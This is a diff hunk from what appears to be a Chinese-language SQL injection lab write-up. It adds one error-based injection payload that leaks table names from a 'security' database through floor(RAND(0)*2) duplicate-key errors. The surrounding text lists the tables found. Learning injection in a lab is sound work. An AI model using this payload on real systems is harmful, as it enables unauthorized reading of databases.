@@ -132,6 +132,10 @@ ERROR 1062 (23000): Duplicate entry '------1' for key 'group_key'
 
 想起来，这种基于聚合函数的报错只能用 limit 一条一条看，那就改一下，一个一个查，查到三张表，`uagents`、`users` 、`emails` 和 `referers` 
 
+```sql
+' union select 1, count(*),concat_ws('-', (select table_name from information_schema.tables where table_schema='security' limit 0, 1),floor(RAND(0)*2))a from information_schema.tables where table_schema='security' group by a--+
+```
+
 ![tables](https://i.loli.net/2020/01/06/VZarthxO6PH1Ggi.png)
 
 
